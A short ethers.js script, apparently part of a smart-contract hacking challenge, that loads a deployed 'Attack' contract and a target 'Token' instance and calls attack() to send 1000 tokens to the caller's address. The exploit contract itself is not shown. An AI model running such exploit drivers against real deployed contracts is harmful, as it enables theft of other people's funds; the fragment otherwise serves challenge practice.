
const attackContractAddress = "0xe55FCd739cD72aDF26942DCfeacfF953c9803768"; // have to write the result of deploy.js
(async () => {
  const account = await ethers.getSigner();
  const contract = await ethers.getContractAt("Attack", attackContractAddress, account);
  const token = await ethers.getContractAt("Token", process.env.INSTANCE,account);
  await contract.attack(account.address, 1000);

})();